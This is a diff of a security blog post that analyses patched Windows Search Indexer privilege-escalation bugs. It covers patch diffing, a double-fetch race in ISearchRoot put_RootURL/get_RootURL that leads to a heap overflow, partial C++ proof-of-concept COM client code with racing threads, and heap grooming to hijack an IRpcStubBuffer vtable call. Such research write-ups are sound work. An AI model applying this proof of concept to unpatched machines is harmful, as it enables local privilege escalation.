@@ -8,13 +8,9 @@ author: SungHyun Park @ Diffense
 
 The Jan-Feb 2020 security patch fixes multiple bugs in the *Windows Search Indexer*. 
 
-Reported CVEs is as follows[^1] :
-- CVE-2020-0613, CVE-2020-0614, CVE-2020-0623, CVE-2020-0625, CVE-2020-0626, CVE-2020-0627, CVE-2020-0628, CVE-2020-0629, CVE-2020-0630, CVE-2020-0631, CVE-2020-0632, CVE-2020-0633 (Jan, 2020)
-- CVE-2020-0666, CVE-2020-0667, CVE-2020-0735, CVE-2020-0752 (Feb, 2020)
-
 ![cve](https://user-images.githubusercontent.com/11327974/77618263-51a95800-6f79-11ea-8fb7-725d72f333d8.jpg)
 
-Several Local Privilege Escalation(LPE) vulnerability in the Windows Search Indexer have been found, as shown above. Thus, we decided to analyze details from the applied patches and share them. 
+Several LPE vulnerabilities in the Windows Search Indexer have been found, as shown above[^1]. Thus, we decided to analyze details from the applied patches and share them. 
 
 
 
@@ -25,11 +21,11 @@ Windows Search Indexer is a Windows Service that handles indexing of your files 
 
 Search Indexer helps direct the users to the service interface through GUI, an indexing options, from their perspectives, as indicated below.
 
-![indexing_option](https://user-images.githubusercontent.com/11327974/77618360-84ebe700-6f79-11ea-8fd1-cfca179ef2a3.png)
+![indexing_option](https://user-images.githubusercontent.com/11327974/77618360-84ebe700-6f79-11ea-8fd1-cfca179ef2a3.png){: width="300" height="300"}
 
-All the DB and temporary data during the indexing process are stored as files and managed. Usually in Windows Service, the whole process is carried out with *NT AUTHORITY SYSTEM* privileges. If the logic bugs happen to exist due to modifying file paths, it may trigger privilege escalation. (E.g. TOCTOU)
+All the DB and temporary data during the indexing process are stored as files and managed. Usually in Windows Service, the whole process is carried out with *NT AUTHORITY SYSTEM* privileges. If the logic bugs happen to exist due to modifying file paths, it may trigger privilege escalation. (E.g. Symlink attack)
 
-We assumed that Search Indexer might be the vulnerability like so, given that most of the vulnerabilities recently occurred in Windows Service were LPE vulnerabilities due to logic bugs. However, the outcome of our analysis was totally unexpected; more details are covered afterward.
+We assumed that Search Indexer might be the vulnerability like so, given that most of the vulnerabilities recently occurred in Windows Service were LPE vulnerabilities due to logic bugs. However, the outcome of our analysis was not that; more details are covered afterward.
 
 
 
@@ -37,14 +33,14 @@ We assumed that Search Indexer might be the vulnerability like so, given that mo
 
 ### Patch Diffing
 
-The analysis environment was Windows7 x86 in that it had a small size of updated file and enabled intuitive diffing. We downloaded both patched and unpatched versions of this module.
+The analysis environment was Windows7 x86 in that it had a small size of the updated file and easy to identified the spot differences. We downloaded both patched and unpatched versions of this module.
 
-For win7 x86 :
+They can be downloaded from Microsoft Update Catalog :
 
-- patched version (January Patch Tuesday) : KB4534314
-- patched version (February Patch Tuesday) : KB4537813
+- unpatched version (July, 2019) : KB4534314[^2]
+- patched version (Feb, 2020) : KB4537813[^3]
 
-They can be downloaded from Microsoft Update Catalog[^2]
+
 
 We started with a BinDiff of the binaries modified by the patch (in this case there is only one: searchindexer.exe)
 
@@ -54,20 +50,22 @@ Most of the patches were done in the CSearchCrawlScopeManager and CSearchRoot cl
 
 The following figure shows that primitive codes were added, which used a Lock to securely access shared resources. We deduced that accessing the shared resources gave rise to the occurrence of the race condition vulnerability in that the patch consisted of putter, getter function.
 
-![a](https://user-images.githubusercontent.com/39076499/77615091-d42e1980-6f71-11ea-8cfe-9e53c018546c.png)
+![image](https://user-images.githubusercontent.com/11327974/77871557-7c4c2700-727f-11ea-8859-02cae37bf1fa.png)
 
-![b](https://user-images.githubusercontent.com/39076499/77615097-d5f7dd00-6f71-11ea-9156-70199300ab65.png)
-
-
+![image](https://user-images.githubusercontent.com/11327974/77871576-8e2dca00-727f-11ea-996a-6e978fbf6227.png)
 
 
-### More detailed analysis of patched functions.
+
+
+### How to interact with the interface
 
 We referred to the MSDN to see how those classes were used and uncovered that they were all related to the Crawl Scope Manager. And we could check the method information of this class.
 
-And the MSDN said[^3] : 
+And the MSDN said[^4] : 
 
-> The Crawl Scope Manager (CSM) is a set of APIs that lets you add, remove, and enumerate search roots and scope rules for the Windows Search indexer. When you want the indexer to begin crawling a new container, you can use the CSM to set the search root(s) and scope rules for paths within the search root(s). For example, if you install a new protocol handler, you can create a search root and add one or more inclusion rules; then the indexer can start a crawl for the initial indexing. The CSM offers the following interfaces to help you do this programmatically.
+> The Crawl Scope Manager (CSM) is a set of APIs that lets you add, remove, and enumerate search roots and scope rules for the Windows Search indexer. When you want the indexer to begin crawling a new container, you can use the CSM to set the search root(s) and scope rules for paths within the search root(s). 
+
+The CSM interface is as follows:
 
 - [IEnumSearchRoots](https://docs.microsoft.com/en-us/windows/desktop/api/Searchapi/nn-searchapi-ienumsearchroots)
 - [IEnumSearchScopeRules](https://msdn.microsoft.com/library/bb266499(VS.85).aspx)
@@ -136,32 +134,32 @@ While analyzing ISearchRoot::put_RootURL and ISearchRoot::get_RootURL, we figure
 
 The put_RootURL function wrote a user-controlled data in the memory of CSearchRoot+0x14. The get_RootURL function read the data located in the memory of CSearchRoot+0x14. , it appeared that the vulnerability was caused by this shared variable concerning patches.
 
-![image](https://user-images.githubusercontent.com/11327974/77677607-484cd980-6fd3-11ea-91ce-91638c0da03c.png)
+![image](https://user-images.githubusercontent.com/11327974/77871953-963a3980-7280-11ea-89a3-125de41b957d.png)
 
-![image](https://user-images.githubusercontent.com/11327974/77677685-60bcf400-6fd3-11ea-8c64-462952e4c8b3.png)
+![image](https://user-images.githubusercontent.com/11327974/77871978-a8b47300-7280-11ea-943a-d54aad5e41d7.png)
 
 Thus, we finally got to the point where the vulnerability actually initiated.
 
 The vulnerability was in the process of double fetching length, and the vulnerability could be triggered when the following occurs:
 
-1. First fetch: Shared variable used as memory allocation size (line 9)
-2. Second fetch: Shared variable used as memory copy size (line 13)
+1. First fetch: Used as memory allocation size (line 9)
+2. Second fetch: Used as memory copy size (line 13)
 
 ![image](https://user-images.githubusercontent.com/11327974/77712748-0c883300-7018-11ea-8c2f-9d588f4d8388.png)
 
-If the size of the first and that of the second differed, a heap overflow might occur, especially when the second fetch had a large size. We maintained that we change the size of pszURL (shared value) sufficiently through the race condition before the memory copy occurs.
+If the size of the first and that of the second differed, a heap overflow might occur, especially when the second fetch had a large size. We maintained that we change the size of pszURL sufficiently through the race condition before the memory copy occurs.
 
 
 
 
-### Triggering POC
+### Crash
 
-Through OleView[^5], we were able to see the interface provided by Windows Search Manager. And we needed to trigger vulnerable functions based on the methods of the interface.
+Through OleView[^5], we were able to see the interface provided by Windows Search Manager. And we needed to hit vulnerable functions based on the methods of the interface.
 
-![Trigger](https://user-images.githubusercontent.com/39076499/77615361-86fe7780-6f72-11ea-8de5-1fb81e2291c3.png)
+![image](https://user-images.githubusercontent.com/11327974/77872142-1365ae80-7281-11ea-964f-ba0295ce0715.png)
 
-Fortunately, we were able to compile and test it through the COM based command line source code provided by MSDN[^4]. 
-We were able to write COM client code that triggered a vulnerable function as following:
+We could easily test it through the COM-based command line source code provided by MSDN[^6]. 
+And wrote the COM client code that hit vulnerable functions as following:
 
 ```cpp
 int wmain(int argc, wchar_t *argv[])
@@ -169,11 +167,11 @@ int wmain(int argc, wchar_t *argv[])
     // Initialize COM library
     CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
 
-    // CoClass Instanciate
+    // Class Instantiate
     ISearchRoot *pISearchRoot;
     CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pISearchRoot));
 
-    // Vulnerable function trigger
+    // Vulnerable functions hit
     pISearchRoot->put_RootURL(L"Shared RootURL");
     PWSTR pszUrl = NULL;
     HRESULT hr = pSearchRoot->get_RootURL(&pszUrl);
@@ -190,7 +188,6 @@ Thereafter, bug triggering was quite simple.
 We created two threads: one writing different lengths of data to the shared buffer and the other reading data from the shared buffer at the same time.
 
 
-Thread_01
 ```cpp
 DWORD __stdcall thread_putter(LPVOID param)
 {
@@ -203,7 +200,7 @@ DWORD __stdcall thread_putter(LPVOID param)
 }
 ```
 
-Thread_02
+
 ```cpp
 DWORD __stdcall thread_getter(LPVOID param)
 {
@@ -237,7 +234,7 @@ int wmain(int argc, wchar_t *argv[])
     CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);
     ISearchRoot *pISearchRoot[20];
     for (int i = 0; i < 20; i++) {
-        HRESULT hr = CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pISearchRoot[i]));
+        CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&pISearchRoot[i]));
     }
     pISearchRoot[3]->Release();
     pISearchRoot[5]->Release();
@@ -246,9 +243,9 @@ int wmain(int argc, wchar_t *argv[])
     pISearchRoot[11]->Release();
 
     
-    HANDLE t1 = CreateThread(NULL, 0, thread_shared_data_write, (LPVOID)pISearchRoot[13], 0, NULL);
-    HANDLE t2 = CreateThread(NULL, 0, thread_shared_data_read, (LPVOID)pISearchRoot[13], 0, NULL);
-    WaitForSingleObject(t1, 500);
+    HANDLE t1 = CreateThread(NULL, 0, thread_getter, (LPVOID)pISearchRoot[13], 0, NULL);
+    HANDLE t2 = CreateThread(NULL, 0, thread_getter, (LPVOID)pISearchRoot[13], 0, NULL);
+    Sleep(500);
     
     CoUninitialize();
     return 0;
@@ -298,13 +295,13 @@ The vtfunction of IRpcStubBuffer is as follows :
     71215bec  712178fa mssprxy!CStdStubBuffer_DebugServerRelease
 ```
 
-When the client's COM is Uninitialized, IRpcStubBuffer::Disconnect disconnects all connections of object pointer. Therefore, if the client call CoUninitialize function after an oob attack, CStdStubBuffer_Disconnect function is called on the server. It means that users can construct fake vtable and call these function.
+When the client's COM is Uninitialized, IRpcStubBuffer::Disconnect disconnects all connections of object pointer. Therefore, if the client calls CoUninitialize function after an oob attack, CStdStubBuffer_Disconnect function is called on the server. It means that user can construct fake vtable and call this function.
 
-However, we haven't always seen IRpcStubBuffer allocated on the same location heap. Therefore, several tries were needed to expect the attackable heap. After several attacks, the IRpcStubBuffer object was covered with the controllable value (0x45454545) as follows.
+However, we haven't always seen IRpcStubBuffer allocated on the same location heap. Therefore, several tries were needed to construct the heap layout. After several tries, the IRpcStubBuffer object was covered with the controllable value (0x45454545) as follows.
 
 In the end, we could show that indirect calls to any function in memory are possible!
 
-![eip](https://user-images.githubusercontent.com/39076499/77615799-8ca88d00-6f73-11ea-961b-6081eccf634d.png)
+![image](https://user-images.githubusercontent.com/11327974/77872957-807a4380-7283-11ea-849b-1e5cf6f03d8e.png)
 
 
 
@@ -322,10 +319,14 @@ We hope that the analysis will serve as an insight to other vulnerabilities rese
 
 [^1]: [https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments](https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments)
 
-[^2]: [https://www.catalog.update.microsoft.com/Home.aspx](https://www.catalog.update.microsoft.com/Home.aspx)
+[^2]: [https://www.catalog.update.microsoft.com/Search.aspx?q=KB4534314](https://www.catalog.update.microsoft.com/Search.aspx?q=KB4534314)
 
-[^3]: [https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm](https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm)
+[^3]: [https://www.catalog.update.microsoft.com/Search.aspx?q=KB4537813](https://www.catalog.update.microsoft.com/Search.aspx?q=KB4537813)
 
-[^4]: [https://docs.microsoft.com/en-us/windows/win32/search/-search-sample-crawlscopecommandline](https://docs.microsoft.com/en-us/windows/win32/search/-search-sample-crawlscopecommandline)
+[^4]: [https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm](https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm)
 
 [^5]: [https://github.com/tyranid/oleviewdotnet](https://github.com/tyranid/oleviewdotnet)
+
+[^6]: [https://docs.microsoft.com/en-us/windows/win32/search/-search-sample-crawlscopecommandline](https://docs.microsoft.com/en-us/windows/win32/search/-search-sample-crawlscopecommandline)
+
+
